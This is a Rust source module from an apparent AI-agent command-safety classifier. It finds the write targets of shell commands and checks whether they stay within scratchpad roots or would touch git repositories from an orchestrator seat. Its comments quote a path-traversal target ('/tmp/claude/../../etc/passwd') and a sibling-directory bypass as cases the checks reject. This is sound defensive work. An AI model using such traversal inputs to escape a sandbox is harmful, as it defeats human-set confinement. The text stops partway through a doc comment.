//! Writes rules for command safety.

use super::*;

/// Issue #168, design decision (a): whether `target` is `/dev/null` or
/// lexically beneath one of `scratchpad_roots` (already forward-slash
/// normalized, no trailing separator). A target carrying `$`, a backtick,
/// `~`, or a shell glob character is never treated as confined -- this
/// classifier is text-only and cannot know what such a target expands to.
/// Reused by [`is_curl_or_wget_get_only`] (this task) and by [`write_
/// targets_confined`] (Task 6).
pub(super) fn target_is_confined(target: &str, scratchpad_roots: &[String]) -> bool {
    if target == "/dev/null" {
        return true;
    }
    if target.contains(['$', '`', '~', '*', '?']) {
        return false;
    }
    // Code review fix round 2 (CRITICAL): a `..` component lexically
    // escapes any prefix-based root check no matter how the separator
    // boundary is guarded -- `/tmp/claude/../../etc/passwd` starts with
    // `/tmp/claude/` and would otherwise pass. Mirrors `strip_known_root_cd_
    // prefix`'s own `path_token.contains("..")` guard: a plain substring
    // reject, not lexical resolution -- the literal two-character sequence
    // is identical whether the surrounding path uses `/` or `\`.
    if target.contains("..") {
        return false;
    }
    let normalized = target.replace('\\', "/");
    // Code review fix (CRITICAL): exact match OR root-plus-separator, the
    // same boundary guard `strip_known_root_cd_prefix` already applies to
    // its own root comparison -- a plain `starts_with` let a SIBLING
    // directory whose name merely shares the root's text as a prefix
    // (`/tmp/claude-evil` against root `/tmp/claude`) ride through as
    // "confined" with nothing separating the two paths.
    scratchpad_roots.iter().any(|root| {
        !root.is_empty() && (normalized == *root || normalized.starts_with(&format!("{root}/")))
    })
}

/// Issue #168/#345: scans `segment` (already heredoc-redacted by the caller)
/// for unquoted path-bearing output redirections: `>`, `>>`, `>|`, `&>`,
/// `&>>`, Bash's legacy `>&word`, and digit-prefixed forms. Input redirections, process
/// substitutions, and descriptor duplications name no write target and are
/// skipped. Command substitutions are scanned recursively because their own
/// output redirections still write; their closing delimiter is never part of
/// the target word. `None` means a real output operator had no usable word
/// after it, so the caller must not guess.
pub(super) fn scan_redirection_targets(segment: &str) -> Option<Vec<String>> {
    scan_redirection_targets_at_depth(segment, 0)
}

fn scan_redirection_targets_at_depth(segment: &str, depth: usize) -> Option<Vec<String>> {
    if depth >= MAX_STRUCTURAL_DEPTH {
        return None;
    }
    let chars: Vec<char> = segment.chars().collect();
    let substitutions = command_substitution_spans(segment);
    let mut substitution_index = 0usize;
    let mut targets = Vec::new();
    for (_, _, body) in &substitutions {
        targets.extend(scan_redirection_targets_at_depth(body, depth + 1)?);
    }
    let mut quote: Option<char> = None;
    let mut escaped = false;
    let mut i = 0usize;
    while i < chars.len() {
        while substitutions
            .get(substitution_index)
            .is_some_and(|(_, end, _)| *end <= i)
        {
            substitution_index += 1;
        }
        let c = chars[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        if c == '\\' && quote != Some('\'') {
            escaped = true;
            i += 1;
            continue;
        }
        if let Some((start, end, _)) = substitutions.get(substitution_index)
            && *start <= i
        {
            substitution_index += 1;
            i = *end;
            continue;
        }
        if let Some(active) = quote {
            if c == active {
                quote = None;
            }
            i += 1;
            continue;
        }
        if matches!(c, '\'' | '"' | '`') {
            quote = Some(c);
            i += 1;
            continue;
        }

        // `<(...)` and `>(...)` are process substitutions, not file
        // redirects. Their bodies are still shell code and may contain a
        // genuine output redirect of their own.
        if matches!(c, '<' | '>') && chars.get(i + 1) == Some(&'(') {
            if let Some(end) = command_substitution_end(&chars, i + 2, depth) {
                let body: String = chars[i + 2..end].iter().collect();
                targets.extend(scan_redirection_targets_at_depth(&body, depth + 1)?);
                i = end + 1;
            } else {
                i += 2;
            }
            continue;
        }

        let digits_end = if c.is_ascii_digit() {
            let mut end = i + 1;
            while chars.get(end).is_some_and(char::is_ascii_digit) {
                end += 1;
            }
            Some(end)
        } else {
            None
        };
        let is_digit_prefixed_input = digits_end.is_some_and(|end| chars.get(end) == Some(&'<'));
        if c == '<' || is_digit_prefixed_input {
            i = digits_end.unwrap_or(i) + 1;
            continue;
        }

        let is_digit_prefixed_redirect = digits_end.is_some_and(|end| chars.get(end) == Some(&'>'));
        let is_amp_redirect = c == '&' && chars.get(i + 1) == Some(&'>');
        if !(c == '>' || is_amp_redirect || is_digit_prefixed_redirect) {
            i += 1;
            continue;
        }
        let mut j = if is_digit_prefixed_redirect {
            digits_end.unwrap_or(i) + 1
        } else if is_amp_redirect {
            i + 2
        } else {
            i + 1
        };
        if chars.get(j) == Some(&'>') || chars.get(j) == Some(&'|') {
            j += 1;
        }
        while chars.get(j).is_some_and(|c| c.is_whitespace()) {
            j += 1;
        }

        // `>&N`, `N>&M`, and `>&-` duplicate or close a descriptor. The
        // operand ends at a shell word boundary, including a command
        // substitution's closing `)`. A non-descriptor word after `>&` is
        // Bash's legacy spelling of `&>word`, however, and still names a real
        // output path; advance past the ampersand so it is collected below.
        if chars.get(j) == Some(&'&') {
            let mut operand_start = j + 1;
            while chars.get(operand_start).is_some_and(|c| c.is_whitespace()) {
                operand_start += 1;
            }
            let mut descriptor_end = operand_start;
            if chars.get(descriptor_end) == Some(&'-') {
                descriptor_end += 1;
            } else {
                while chars.get(descriptor_end).is_some_and(char::is_ascii_digit) {
                    descriptor_end += 1;
                }
            }
            let is_descriptor = descriptor_end > operand_start
                && chars.get(descriptor_end).is_none_or(|c| {
                    c.is_whitespace() || matches!(c, ';' | '&' | '|' | '<' | '>' | '(' | ')')
                });
            if is_descriptor {
                i = descriptor_end;
                continue;
            }
            j = operand_start;
        }

        let target_start = j;
        let mut target_quote = None;
        while let Some(&c) = chars.get(j) {
            if let Some(active) = target_quote {
                if c == active {
                    target_quote = None;
                }
            } else if matches!(c, '\'' | '"') {
                target_quote = Some(c);
            } else if c.is_whitespace() || matches!(c, ';' | '&' | '|' | '<' | '>' | '(' | ')') {
                break;
            }
            j += 1;
        }
        if target_quote.is_some() {
            return None;
        }
        let target: String = chars[target_start..j].iter().collect();
        if target.is_empty() {
            // A dangling operator with nothing after it at all -- ambiguous.
            return None;
        }
        targets.push(sql_tokens(&target)?.into_iter().next()?);
        i = j;
    }
    Some(targets)
}

/// Issue #168, design decision (d): one segment's write targets, or `None`
/// if this cannot be confidently resolved -- either a dangling redirection
/// operator ([`scan_redirection_targets`] itself), or a `tee` argument
/// containing `$`/backtick so it cannot be proven a literal path.
pub(super) fn segment_redirect_targets(segment: &str) -> Option<Vec<String>> {
    let mut targets = scan_redirection_targets(segment)?;
    if let Some(tokens) = path_command_tokens(segment)
        && let Some(first) = tokens.first()
        && sql_program_name(first) == "tee"
    {
        for token in tokens.iter().skip(1) {
            if token.starts_with('-') {
                continue;
            }
            if token.contains(['$', '`']) {
                return None;
            }
            targets.push(token.clone());
        }
    }
    Some(targets)
}

/// Shell redirects belong to the shell, not to tee/mkdir's path operands.
/// Inspect raw words so a quoted filename such as `'>log'` stays an argument.
pub(super) fn path_command_tokens(segment: &str) -> Option<Vec<String>> {
    let quoted = tokenize_quoted(&segment.chars().collect::<Vec<_>>());
    let mut words = quoted.iter();
    let mut tokens = Vec::new();
    while let Some(word) = words.next() {
        let raw = word.text.as_str();
        let redirect = raw.trim_start_matches(|c: char| c.is_ascii_digit());
        let redirect = redirect.strip_prefix('&').unwrap_or(redirect);
        if redirect.starts_with(['<', '>']) {
            let target = redirect.trim_start_matches(['<', '>', '|']);
            if target.is_empty() {
                words.next()?;
            }
            continue;
        }
        tokens.push(raw.to_string());
    }
    sql_tokens(&tokens.join(" "))
}

pub(super) fn segment_write_targets(segment: &str) -> Option<Vec<String>> {
    let mut targets = segment_redirect_targets(segment)?;
    let Some(tokens) = path_command_tokens(segment) else {
        return Some(targets);
    };
    let Some(first) = tokens.first() else {
        return Some(targets);
    };
    let program = sql_program_name(first);
    if !is_file_access_program(&program) {
        return Some(targets);
    }
    match program.as_str() {
        "cp" | "mv" | "ln" | "install" | "rsync" => {
            if let Some(target) = tokens
                .iter()
                .enumerate()
                .skip(1)
                .find_map(|(i, _)| {
                    option_value(&tokens, i, &["-t", "--target-directory"])
                        .filter(|_| program != "rsync")
                })
                .or_else(|| last_non_flag_argument(&tokens))
            {
                targets.push(target.to_string());
            }
        }
        "touch" | "mkdir" | "truncate" | "rm" => {
            let value_flags: &[&str] = match program.as_str() {
                "touch" => &["-t", "-d", "-r", "--date", "--reference"],
                "mkdir" => &["-m", "--mode"],
                "truncate" => &["-s", "-r", "--size", "--reference"],
                _ => &[],
            };
            let mut i = 1;
            let mut options = true;
            while i < tokens.len() {
                let token = &tokens[i];
                if options && token == "--" {
                    options = false;
                } else if options && value_flags.contains(&token.as_str()) {
                    i += 1;
                } else if !options || !token.starts_with('-') {
                    targets.push(token.clone());
                }
                i += 1;
            }
        }
        "sed" if tokens[1..].iter().any(|t| is_sed_perl_inplace_flag(t)) => {
            targets.extend(sed_perl_inplace_targets(&program, &tokens));
        }
        "dd" => targets.extend(
            tokens[1..]
                .iter()
                .filter_map(|t| t.strip_prefix("of=").map(str::to_string)),
        ),
        _ => {}
    }
    if targets.iter().any(|target| target.contains(['$', '`'])) {
        return None;
    }
    Some(targets)
}

/// Resolve only literals established by earlier standalone assignments or
/// exports. Never follow aliases, ambient variables, conditional assignments,
/// subshells, or commands that can change the calling shell's variables.
/// Keep the raw segment alongside it: policy rules always see the original.
pub(super) fn literal_write_segments(command: &str) -> Vec<(String, String)> {
    // A function or trap can mutate a variable after its definition was
    // scanned. Check the WHOLE command before trusting any assignment; a
    // forward-only map cannot model deferred execution or shell scope.
    if !literal_assignments_are_stable(command) {
        return split_segments(command)
            .into_iter()
            .map(|segment| (segment.clone(), segment))
            .collect();
    }
    let mut literals = std::collections::HashMap::new();
    let mut remaining = command;
    let mut previous_separator = "";
    let mut segments = Vec::new();
    for segment in split_segments(command) {
        remaining = &remaining[segment.len()..];
        let tail = remaining.trim_start_matches([';', '\n', '&', '|']);
        let separator = &remaining[..remaining.len() - tail.len()];
        remaining = tail;
        let tokens = tokenize_quoted(&segment.chars().collect::<Vec<_>>());
        let first = tokens.first().map(|t| t.text.as_str()).unwrap_or("");
        let resolved = substitute_literal_variables(&segment, &literals);
        let assignments = if first == "export" {
            &tokens[1..]
        } else {
            &tokens[..]
        };
        if !assignments.is_empty()
            && assignments
                .iter()
                .all(|t| is_shell_identifier_assignment(&t.text))
        {
            for token in assignments {
                let (name, value) = token.text.split_once('=').unwrap_or_default();
                literals.remove(name);
                if previous_separator.contains(['&', '|']) || separator.contains(['&', '|']) {
                    continue;
                }
                let Some(values) = sql_tokens(value) else {
                    continue;
                };
                if let [value] = values.as_slice()
                    && !value.contains(['$', '`', '*', '?', '[', '~', '\\'])
                {
                    literals.insert(name.to_string(), value.clone());
                }
            }
        }
        segments.push((segment, resolved));
        previous_separator = separator;
    }
    segments
}

/// Only a single assignment per name in a simple command list is resolved.
/// This is deliberately a smaller language than shell: uncertain syntax
/// leaves expansions intact for the existing approval path.
fn literal_assignments_are_stable(command: &str) -> bool {
    if !literal_assignment_syntax_is_simple(command) {
        return false;
    }
    let mut assigned = std::collections::HashSet::new();
    for segment in split_segments(command) {
        let Some(tokens) = sql_tokens(&segment) else {
            return false;
        };
        for token in &tokens {
            if is_shell_identifier_assignment(token) {
                let (name, _) = token.split_once('=').unwrap_or_default();
                if !assigned.insert(name.to_string()) {
                    return false;
                }
            }
        }
        let start = usize::from(tokens.first().is_some_and(|token| token == "export"));
        if tokens.len() > start
            && tokens[start..]
                .iter()
                .all(|token| is_shell_identifier_assignment(token))
        {
            // An assignment is not an executable path. Normalizing its
            // program basename could truncate a quoted directory value.
            continue;
        }
        // Include the original head (for/select) as well as normalized
        // executable heads (e.g. `builtin read` or `command eval`). Leading
        // shell redirects cannot hide a variable-mutating builtin either.
        for candidate in std::iter::once(segment.clone()).chain(normalize_segments(&segment)) {
            let Some(words) = path_command_tokens(&candidate) else {
                return false;
            };
            let Some(program) = words.first() else {
                continue;
            };
            if SHELL_STRUCTURAL_KEYWORDS.contains(&program.as_str())
                || program.contains(['$', '{', '}'])
                || matches!(
                    program.as_str(),
                    "select"
                        | "builtin"
                        | "command"
                        | "time"
                        | "!"
                        | "noglob"
                        | "nocorrect"
                        | "function"
                        | "trap"
                        | "eval"
                        | "source"
                        | "."
                        | "read"
                        | "unset"
                        | "declare"
                        | "local"
                        | "typeset"
                        | "readonly"
                        | "let"
                        | "mapfile"
                        | "readarray"
                        | "getopts"
                        | "set"
                        | "alias"
                        | "unalias"
                        | "autoload"
                        | "enable"
                )
                || (program == "printf" && words.iter().any(|word| word.starts_with("-v")))
                || (program.contains('=') && !is_shell_identifier_assignment(program))
                || (program == "export"
                    && !words[1..]
                        .iter()
                        .all(|word| is_shell_identifier_assignment(word)))
            {
                return false;
            }
        }
    }
    true
}

/// Ignore quoted data such as grep patterns and printf formats, while
/// rejecting executable substitutions, functions, arithmetic and escaped
/// command names. Double-quoted expansions still execute in the shell.
fn literal_assignment_syntax_is_simple(command: &str) -> bool {
    let chars: Vec<_> = command.chars().collect();
    let mut quote = None;
    let mut escaped = false;
    for (i, &c) in chars.iter().enumerate() {
        if escaped {
            escaped = false;
            continue;
        }
        if quote == Some('\'') {
            if c == '\'' {
                quote = None;
            }
            continue;
        }
        if c == '\\' {
            if quote.is_none() {
                return false;
            }
            escaped = true;
            continue;
        }
        if quote == Some(c) {
            quote = None;
            continue;
        }
        if quote.is_none() && matches!(c, '\'' | '"') {
            quote = Some(c);
            continue;
        }
        if c == '`' || (quote.is_none() && matches!(c, '(' | ')')) {
            return false;
        }
        if c == '$' {
            if chars.get(i + 1) == Some(&'(') {
                return false;
            }
            if chars.get(i + 1) == Some(&'{') {
                let name: String = chars[i + 2..].iter().take_while(|&&c| c != '}').collect();
                if !is_shell_identifier_assignment(&format!("{name}=")) {
                    return false;
                }
            }
        }
    }
    quote.is_none() && !escaped
}

fn substitute_literal_variables(
    segment: &str,
    literals: &std::collections::HashMap<String, String>,
) -> String {
    let chars: Vec<char> = segment.chars().collect();
    let mut out = String::new();
    let mut quote = None;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '\\' && quote != Some('\'') {
            out.push(c);
            i += 1;
            if let Some(&escaped) = chars.get(i) {
                out.push(escaped);
                i += 1;
            }
            continue;
        }
        if c == '$' && quote != Some('\'') {
            let braced = chars.get(i + 1) == Some(&'{');
            let start = i + if braced { 2 } else { 1 };
            let mut end = start;
            while chars
                .get(end)
                .is_some_and(|c| c.is_ascii_alphanumeric() || *c == '_')
            {
                end += 1;
            }
            let name: String = chars[start..end].iter().collect();
            if (!braced || chars.get(end) == Some(&'}'))
                && let Some(value) = literals.get(&name)
                && !value.contains(['"', '\\'])
                && (quote == Some('"')
                    || !value
                        .chars()
                        .any(|c| c.is_whitespace() || ";&|<>()'".contains(c)))
            {
                out.push_str(value);
                i = end + usize::from(braced);
                continue;
            }
        }
        if quote == Some(c) {
            quote = None;
        } else if quote.is_none() && matches!(c, '\'' | '"') {
            quote = Some(c);
        }
        out.push(c);
        i += 1;
    }
    out
}

/// Issue #168, design decision (d): whether every write target across every
/// segment of `command` is `/dev/null` or beneath one of `scratchpad_roots`.
/// `None` -- no opinion, exactly today's un-analyzed behavior -- whenever
/// `scratchpad_roots` is empty, any segment's own targets cannot be
/// confidently resolved (see [`segment_redirect_targets`]), a target contains
/// `$`/backtick after resolving earlier same-command literal assignments
/// (distinct from a target merely containing `~`/a glob
/// character, which [`target_is_confined`] can confidently call "not
/// confined" without further ambiguity), or -- CRITICAL -- `command` names
/// no write target at all (no redirection, no `tee`). That last case matters
/// because this function's caller only ever widens a verdict when it
/// returns `Some(true)`: without this guard, ANY command with zero writes
/// (an ordinary `ssh host uptime`, a bare `2>&1` with nothing
/// else) would vacuously satisfy "every target is confined" and get widened
/// to `Allow` just for not writing anywhere at all -- which is not what this
/// design decision is for (a compound that DOES write, confined to the
/// scratchpad). `None` here correctly leaves such a command to classify
/// exactly as it does today. Heredoc bodies are redacted first, the same as
/// every other classifier in this module.
pub(crate) fn write_targets_confined(command: &str, scratchpad_roots: &[String]) -> Option<bool> {
    if scratchpad_roots.is_empty() {
        return None;
    }
    let sanitized = redact_single_quoted_heredocs(command);
    let mut confined = true;
    let mut saw_any_target = false;
    for (_, segment) in literal_write_segments(&sanitized) {
        let mut targets = segment_redirect_targets(&segment)?;
        saw_any_target |= !targets.is_empty();
        targets.extend(mkdir_write_targets(&segment)?);
        for target in &targets {
            if target.contains(['$', '`']) {
                return None;
            }
            if !target_is_confined(target, scratchpad_roots) {
                confined = false;
            }
        }
    }
    if !saw_any_target {
        return None;
    }
    Some(confined)
}

// -- orchestrator repo-write guard (issues #328/#334) ---------------------

/// Blanks runs of two or more consecutive `<` (a heredoc `<<`/here-string
/// `<<<` operator) to spaces before `segment` reaches [`segment_write_
/// targets`] -- that scanner has no heredoc-syntax awareness of its own,
/// and a heredoc opener's `<<'DELIM'` (left standing by [`redact_single_
/// quoted_heredocs`], which only blanks the BODY) reads as a second,
/// dangling INPUT redirect with nothing after it, aborting the scan of the
/// whole segment and discarding a real `>` write target earlier on the
/// same line (`cat > README.md <<'EOF'`). A lone `<` is left alone: an
/// ordinary input redirect, already folded into `segment_write_targets`'s
/// own targets exactly like today.
fn neutralize_heredoc_operator(segment: &str) -> String {
    let chars: Vec<char> = segment.chars().collect();
    let mut out = String::with_capacity(chars.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '<' && chars.get(i + 1) == Some(&'<') {
            out.push(' ');
            out.push(' ');
            i += 2;
            while chars.get(i) == Some(&'<') {
                out.push(' ');
                i += 1;
            }
            continue;
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

/// Resolves `target` through its longest existing filesystem prefix before
/// forward-slash and `.`/`..` normalization: an absolute target (`/`, `~`, or drive
/// letter) is normalized as-is; a relative one resolves against `cwd`.
/// `None` when `target` cannot be confidently resolved at all -- it
/// carries `$`/a backtick (built through expansion this resolver
/// cannot resolve), or it is `/dev/null` (never a write target in the
/// first place). A `~`-prefixed result is left exactly as written -- it is
/// not a real filesystem-absolute path (expanding it needs `$HOME`, which
/// this resolver never reads), so [`repo_write_violation`] treats
/// it as unresolvable rather than feeding it to `repo_root_of`.
pub(super) fn resolve_repo_write_target(target: &str, cwd: &str) -> Option<String> {
    if target.contains(['$', '`']) || target == "/dev/null" {
        return None;
    }
    let normalized = target.replace('\\', "/");
    let is_absolute = normalized.starts_with('/')
        || normalized.starts_with('~')
        || (normalized.as_bytes().get(1) == Some(&b':')
            && matches!(normalized.as_bytes().get(2), Some(b'/')));
    let combined = if is_absolute {
        normalized
    } else {
        format!("{cwd}/{normalized}")
    };
    let combined = if Path::new(&combined).is_absolute() {
        super::pathutil::canonicalize_with_missing_tail(Path::new(&combined))?
            .to_string_lossy()
            .replace('\\', "/")
    } else {
        combined
    };
    // `std::fs::canonicalize` returns an extended-length `\\?\C:\...`
    // path on Windows. After separator normalization that is `//?/C:/...`;
    // treating it as an ordinary slash-rooted path turns it into the invalid
    // `/?/C:/...` and makes the repository ancestor walk miss every write.
    // Strip the verbatim prefix while preserving UNC's double-slash root.
    let combined = if let Some(rest) = combined.strip_prefix("//?/UNC/") {
        format!("//{rest}")
    } else if let Some(rest) = combined.strip_prefix("//?/") {
        rest.to_string()
    } else {
        combined
    };
    if let Some(rest) = combined.strip_prefix("//") {
        Some(format!(
            "//{}",
            resolve_lexical_path_components(rest).join("/")
        ))
    } else if let Some(rest) = combined.strip_prefix('/') {
        Some(format!(
            "/{}",
            resolve_lexical_path_components(rest).join("/")
        ))
    } else if combined.as_bytes().get(1) == Some(&b':') {
        let (drive, rest) = combined.split_at(2);
        let rest = rest.strip_prefix('/').unwrap_or(rest);
        Some(format!(
            "{drive}/{}",
            resolve_lexical_path_components(rest).join("/")
        ))
    } else {
        Some(resolve_lexical_path_components(&combined).join("/"))
    }
}

/// `target` is a repository write iff its resolved, filesystem-absolute
/// form ([`resolve_repo_write_target`]) sits inside a git repository
/// (`repo_root_of` finds a `.git` ancestor for it) AND is not equal to or
/// nested under that repo's own `.zirv/work` or `.zirv/memory` -- the same
/// root-plus-separator boundary rule [`target_is_confined`] applies to its
/// own scratchpad roots. Issue #334 MAJOR fix: which repository owns the
/// target is answered PER TARGET, not assumed to be the launch repo --
/// `git repo /a` and `git repo /b/.zirv/work` are two different repos'
/// scratch areas, and a sibling checkout's own `.zirv/work` never confines
/// a write into the launch repo, or vice versa. A target under Claude Code's
/// own harness home (`CLAUDE_CONFIG_DIR`, `$HOME/.claude`, or
/// `%USERPROFILE%\\.claude`) is likewise not a repository write. A resolved form that is not filesystem-absolute at
/// all (a `~`-prefixed target) is never even handed to `repo_root_of`: this
/// module cannot resolve `~` to a real path, so it stays unresolvable rather
/// than guessed at. Returns `target` unchanged (as originally written) on a
/// violation, so a caller can report it without leaking a resolved absolute
/// path.
fn repo_write_violation(
    target: &str,
    cwd: &str,
    repo_root_of: &dyn Fn(&str) -> Option<String>,
    env: EnvLookup<'_>,
) -> Option<String> {
    let resolved = resolve_repo_write_target(target, cwd)?;
    let is_filesystem_absolute = resolved.starts_with('/')
        || (resolved.as_bytes().get(1) == Some(&b':')
            && matches!(resolved.as_bytes().get(2), Some(b'/')));
    if !is_filesystem_absolute {
        return None;
    }
    if super::lifecycle::target_is_under_harness_home(std::path::Path::new(&resolved), env) {
        return None;
    }
    let root = repo_root_of(&resolved)?;
    let allowed_roots = [format!("{root}/.zirv/work"), format!("{root}/.zirv/memory")];
    let under_allowed = allowed_roots
        .iter()
        .any(|allowed| resolved == *allowed || resolved.starts_with(&format!("{allowed}/")));
    if under_allowed {
        None
    } else {
        Some(target.to_string())
    }
}

/// The nearest git repository root containing `path` (issue #334): starts
/// at `path`'s own PARENT directory -- the file itself may not exist yet
/// (`cp`/`mv`'s destination need not, though `sed -i`'s target usually
/// does) -- and walks upward looking for a `.git` entry (a directory for
/// an ordinary checkout, a plain file naming the real gitdir for a linked
/// worktree -- either counts, `Path::exists` alone answers both). `None`
/// when no ancestor up to the filesystem root carries one, or `path` has
/// no parent at all (already the root). The one real filesystem walk in
/// this guard: [`orchestrator_repo_write_target`] itself stays pure and
/// takes this as an injected closure so tests can fake it deterministically.
pub(super) fn filesystem_repo_root_of(path: &str) -> Option<String> {
    let mut dir = std::path::Path::new(path).parent()?.to_path_buf();
    loop {
        if dir.join(".git").exists() {
            return Some(
                dir.to_string_lossy()
                    .replace('\\', "/")
                    .trim_end_matches('/')
                    .to_string(),
            );
        }
        if !dir.pop() {
            return None;
        }
    }
}

/// Like [`split_segments`], but each segment also carries whether the
/// separator immediately before it was a pipe (`|` or `|&`, not `||`) --
/// issue #334's `git apply`/`git am`/`patch` carve-out needs that. A direct
/// alias for [`tokenize_segments`], which already returns exactly this
/// shape.
pub(super) fn split_segments_with_pipe_marker(command: &str) -> Vec<(String, bool)> {
    tokenize_segments(command)
}

/// The sentinel label [`orchestrator_repo_write_target`] reports for a
/// `git apply`/`git am`/`patch` segment -- `None` for every other `git`
/// subcommand (`commit`, `merge`, `cherry-pick`, `checkout`, `stash`,
/// `worktree`, ...), which stay exempt as before: git integration is the
/// orchestrator seat's own job. These three specifically are NOT exempt on
/// program name alone, because they apply an arbitrary diff to the working
/// tree -- the write can land anywhere the diff names, regardless of where
/// the diff text itself came from (a heredoc, a literal file argument, a
/// `<` redirect, or bare stdin all count). `subcommand` must be the git
/// action [`git_action`] resolves -- NOT a raw `tokens.get(1)` -- so a
/// global option ahead of the verb (`git -C <dir>`, `-c k=v`, `--git-dir=`,
/// `--work-tree=`, `--namespace=`) can never be mistaken for the verb
/// itself and slip an actual `apply`/`am` through to the blanket `git`
/// exemption (issue #334 review round 2, HIGH: `git -C <sibling-worktree>
/// apply p.diff` used to do exactly that).
fn git_apply_program_label(program: &str, subcommand: Option<&str>) -> Option<&'static str> {
    match (program, subcommand) {
        ("git", Some("apply")) => Some("<git apply>"),
        ("git", Some("am")) => Some("<git am>"),
        ("patch", _) => Some("<patch>"),
        _ => None,
    }
}

/// Diff-producing `git` actions (issue #334 review round 2, MEDIUM) whose
/// output is a legitimate upstream for a piped `git apply`/`git am` -- the
/// one form that is how the orchestrator seat integrates a worker's diff
/// rather than authoring one itself (`git -C <wt> diff | git apply`, `git
/// format-patch --stdout | git am`). Deliberately narrow, not "any `git`
/// subcommand": `git cat-file -p <sha>:path | git apply` reads an
/// arbitrary blob, not necessarily a diff, and every other `git` action
/// (`log` without `-p`, `status`, `commit`, ...) does not reliably produce
/// patch-shaped output either -- resolved via [`git_action`] the same way
/// [`git_apply_program_label`]'s own `subcommand` is, so a global option
/// ahead of the verb cannot hide a non-diff action behind it either.
const GIT_DIFF_PRODUCING_ACTIONS: &[&str] = &[
    "diff",
    "show",
    "format-patch",
    "diff-tree",
    "diff-index",
    "log",
];

/// Whether `token` is a `sed`/`perl` in-place-edit flag: `-i`, `-i<suffix>`
/// (`-i.bak`), `--in-place[=<suffix>]`, or a clustered short-flag group
/// containing `i` (`-pi`, `-pie`, `-ni`).
pub(super) fn is_sed_perl_inplace_flag(token: &str) -> bool {
    if token == "--in-place" || token.starts_with("--in-place=") {
        return true;
    }
    if token.starts_with("--") || !token.starts_with('-') || token.len() < 2 {
        return false;
    }
    token[1..].contains('i')
}

/// The file-argument positionals a `sed`/`perl` in-place edit (`program` at
/// `tokens[0]`) would write to: every non-flag argument that is not the
/// script/expression consumed by an `-e`/`-f` flag, and -- for `sed` with
/// no `-e`/`-f` anywhere on the line -- not the first positional either
/// (its own implicit script).
fn sed_perl_inplace_targets(program: &str, tokens: &[String]) -> Vec<String> {
    let has_e_or_f = tokens[1..].iter().any(|t| t == "-e" || t == "-f");
    let mut awaiting_implicit_script = program == "sed" && !has_e_or_f;
    let mut targets = Vec::new();
    let mut i = 1;
    while i < tokens.len() {
        let token = &tokens[i];
        if token == "-e" || token == "-f" {
            i += 2;
            continue;
        }
        if token.starts_with('-') {
            i += 1;
            continue;
        }
        if awaiting_implicit_script {
            awaiting_implicit_script = false;
            i += 1;
            continue;
        }
        targets.push(token.clone());
        i += 1;
    }
    targets
}

/// The last non-flag argument of `tokens` (`cp`/`mv`/`install`/`rsync`/`ln`
/// all write to their final positional).
fn last_non_flag_argument(tokens: &[String]) -> Option<&str> {
    tokens[1..]
        .iter()
        .rfind(|t| !t.starts_with('-'))
        .map(String::as_str)
}

/// The code argument following a `-c`/`-e` flag among `tokens`, for an
/// inline interpreter invocation (`python3 -c "..."`, `node -e "..."`).
fn inline_interpreter_code(tokens: &[String]) -> Option<&str> {
    let mut iter = tokens[1..].iter();
    while let Some(token) = iter.next() {
        if token == "-c" || token == "-e" {
            return iter.next().map(String::as_str);
        }
    }
    None
}

/// Plain substring write primitives: present anywhere in inline
/// interpreter `code` means a write, no further analysis needed.
const INLINE_WRITE_PRIMITIVES: &[&str] = &[
    ".write_text(",
    ".write_bytes(",
    "writeFile",
    "writeFileSync",
    "appendFile",
    "File.write",
    "file_put_contents(",
];

/// Open-style primitives that only mean a write when paired with a write
/// mode (see [`INLINE_WRITE_MODE_LITERALS`]) -- an `open('f').read()` is
/// not a write.
const INLINE_MODE_GATED_PRIMITIVES: &[&str] = &["open(", "File.open", "fopen("];

const INLINE_WRITE_MODE_LITERALS: &[&str] = &[
    "'w'", "\"w\"", "'a'", "\"a\"", "'wb'", "\"wb\"", "'ab'", "\"ab\"", "'w+'", "\"w+\"", "'a+'",
    "\"a+\"", "'x'", "\"x\"",
];

/// Whether inline interpreter `code` contains a recognized write primitive
/// -- approximate (a substring scan, not a real parse), deliberately
/// permissive toward flagging: an orchestrator seat only ever pays for a
/// false positive here by dispatching a worker it did not strictly need,
/// never by silently keeping a real write.
fn inline_code_has_write_primitive(code: &str) -> bool {
    if INLINE_WRITE_PRIMITIVES.iter().any(|p| code.contains(p)) {
        return true;
    }
    INLINE_MODE_GATED_PRIMITIVES
        .iter()
        .any(|p| code.contains(p))
        && INLINE_WRITE_MODE_LITERALS.iter().any(|m| code.contains(m))
}

/// Issue #334: the first repository file `command` would write from an
/// orchestrator seat, or `None`. `cwd` is forward-slash normalized, no
/// trailing slash; `repo_root_of(absolute_path)` returns the nearest git
/// repository root containing `absolute_path`, or `None` when it names no
/// repository at all -- production passes a real filesystem walk
/// ([`filesystem_repo_root_of`]), tests pass a deterministic fake.
/// Environment lookup is injected; filesystem access is limited to the
/// shared canonical harness-home containment check and the injected
/// `repo_root_of` callback.
///
/// Scans each of [`split_segments_with_pipe_marker`]'s segments (over the
/// already heredoc-redacted command) for five write shapes: (a) a
/// redirect/`tee` target ([`segment_write_targets`]); (b) a `sed`/`perl`
/// in-place edit's file arguments; (c) the last argument of `cp`/`mv`/
/// `install`/`rsync`/`ln`; (d) an inline interpreter (`python`/`python3`/
/// `node`/`ruby`/`perl`/`php`) invoked with `-c`/`-e` whose code contains a
/// write primitive and mentions none of `cwd`'s own repo's allowed roots;
/// (e) `git apply`, `git am`, or `patch` ([`git_apply_program_label`]) --
/// these three apply an arbitrary diff to the working tree, so they are
/// NEVER exempt on program name alone the way every other `git` subcommand
/// is, UNLESS the segment is itself piped from an immediately preceding
/// `git` segment whose OWN action is one of [`GIT_DIFF_PRODUCING_ACTIONS`]
/// (`git -C <wt> diff | git apply`, `git format-patch --stdout | git am`)
/// -- the one form that is how the seat integrates a worker's diff rather
/// than authoring one itself; `git cat-file -p <sha>:path | git apply` is
/// NOT exempt, a non-diff `git` action is no safer an upstream than a
/// non-`git` one. Every `git` action -- both the segment's own (for the
/// apply/am/patch check) and its would-be upstream's (for the pipe
/// exemption) -- is resolved via [`git_action`], which skips `git`'s own
/// global options (`-C <dir>`, `-c k=v`, `--git-dir=`, `--work-tree=`,
/// `--namespace=`) ahead of the verb, so neither can be defeated by one.
///
/// Known gaps, documented rather than chased (this classifier is text-only
/// and argv-scoped, the same declared limits every other classifier in
/// this module accepts):
